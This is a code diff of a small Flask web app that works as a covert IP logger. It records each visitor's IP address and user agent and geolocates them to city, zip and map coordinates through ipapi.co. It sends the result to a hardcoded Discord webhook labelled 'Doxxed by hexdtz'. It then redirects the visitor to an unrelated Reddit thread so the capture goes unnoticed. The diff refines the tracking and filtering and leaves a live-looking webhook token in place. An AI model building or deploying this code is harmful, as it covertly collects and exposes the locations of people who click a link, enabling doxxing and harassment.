@@ -7,18 +7,22 @@ app = Flask(__name__)
 
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1427010775163080868/6Uaf91MUBd4GO3eYSf4y3i0VZkKQh0_pFQFO7H8M42IKWwYQmEkNcisypFHTmvTClpoS"
 
-# Simple set to store already-logged IPs (not persistent, just in-memory)
-recent_ips = set()
+logged_ips = set()
+
+def get_real_ip():
+    xff = request.headers.get("X-Forwarded-For", "")
+    ip_list = xff.split(",")
+    real_ip = ip_list[0].strip() if ip_list else request.remote_addr
+    return real_ip
 
 def get_visitor_info(ip, user_agent):
-    ipapi_url = f"https://ipapi.co/{ip}/json/"
-
     try:
-        details = requests.get(ipapi_url, timeout=3).json()
+        r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=3)
+        details = r.json()
     except Exception:
         details = {}
 
-    info = {
+    return {
         "ip": ip,
         "user_agent": user_agent,
         "country": details.get("country_name", "Unknown"),
@@ -28,26 +32,25 @@ def get_visitor_info(ip, user_agent):
         "zip": details.get("postal", ""),
         "lat": details.get("latitude", 0),
         "lon": details.get("longitude", 0),
-        "date": datetime.utcnow().strftime("%d/%m/%Y"),  # GMT/UTC
-        "time": datetime.utcnow().strftime("%H:%M:%S"),  # GMT/UTC
+        "date": datetime.utcnow().strftime("%d/%m/%Y"),
+        "time": datetime.utcnow().strftime("%H:%M:%S"),
     }
-    return info
 
 def send_to_discord(info):
     flag_url = f"https://countryflagsapi.com/png/{info['countryCode']}"
-    ip_city = f"{info['ip']} ({info['city'] if info['city'] else 'Unknown City'})"
+    ip_city = f"{info['ip']} ({info['city']})"
 
     embed = {
-        "username": "Doxxed by hexdtz",  # Custom name
+        "username": "Doxxed by hexdtz",
         "avatar_url": flag_url,
         "embeds": [{
-            "title": f"Visitor From {info['country']}",
+            "title": f"🌍 Visitor From {info['country']}",
             "color": 39423,
             "fields": [
                 {"name": "IP & City", "value": ip_city, "inline": True},
                 {"name": "User Agent", "value": info["user_agent"], "inline": False},
-                {"name": "Country / Code", "value": f"{info['country']} / {info['countryCode'].upper()}", "inline": True},
-                {"name": "Region | City | Zip", "value": f"[{info['region']} | {info['city']} | {info['zip']}](https://www.google.com/maps/search/?api=1&query={info['lat']},{info['lon']})", "inline": False},
+                {"name": "Region | Zip", "value": f"{info['region']} | {info['zip']}", "inline": True},
+                {"name": "Google Maps", "value": f"[View Location](https://www.google.com/maps?q={info['lat']},{info['lon']})", "inline": False},
             ],
             "footer": {
                 "text": f"Time (GMT): {info['date']} {info['time']}",
@@ -57,20 +60,21 @@ def send_to_discord(info):
     }
 
     headers = {"Content-Type": "application/json"}
-    requests.post(DISCORD_WEBHOOK_URL, data=json.dumps(embed), headers=headers)
+    requests.post(DISCORD_WEBHOOK_URL, json=embed, headers=headers)
 
 @app.route('/')
 def index():
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    user_agent = request.headers.get('User-Agent', 'Unknown')
+    ip = get_real_ip()
+    user_agent = request.headers.get("User-Agent", "Unknown")
 
-    if ip not in recent_ips:
-        recent_ips.add(ip)
+    # Only log once per IP per server session
+    if ip not in logged_ips and "Mozilla" in user_agent:
+        logged_ips.add(ip)
         info = get_visitor_info(ip, user_agent)
         send_to_discord(info)
 
-    # Redirect after capture
     return redirect("https://www.reddit.com/r/football/comments/y8xqif/how_to_be_better_in_football_in_a_fast_time/")
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
+
